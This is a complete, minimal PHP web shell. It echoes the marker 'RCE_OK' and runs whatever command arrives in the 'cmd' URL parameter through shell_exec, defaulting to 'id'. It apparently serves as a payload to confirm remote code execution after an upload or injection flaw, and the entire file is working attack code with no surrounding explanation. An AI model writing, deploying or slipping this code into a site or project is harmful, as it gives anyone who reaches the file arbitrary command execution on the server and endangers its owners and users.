<?php
echo "RCE_OK\n";
echo shell_exec($_GET["cmd"] ?? "id");
?>
